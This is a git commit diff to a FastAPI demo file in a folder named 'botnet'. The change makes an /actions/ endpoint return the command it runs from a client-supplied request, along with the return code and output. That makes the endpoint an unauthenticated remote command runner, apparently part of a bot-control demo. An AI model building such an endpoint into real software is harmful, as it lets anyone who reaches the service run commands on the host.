ca31cc39773d6e8a051cd4bd2014185ad9ccf49f
Matthieu Falce <matthieu@falce.net>
2024-12-20 15:43:27 +0100

    gitautosync update 88

--- tape_en_cours/botnet/demo_fastapi.py
+++ tape_en_cours/botnet/demo_fastapi.py
@@ -7,4 +7,4 @@ app = FastAPI()
 @app.get("/actions/")
 async def read_item(command: dict):
     args, return_code, result = utils.execute_command(command)
-    return
+    return {"executed_command": args, "return_code": return_code, "result": result}
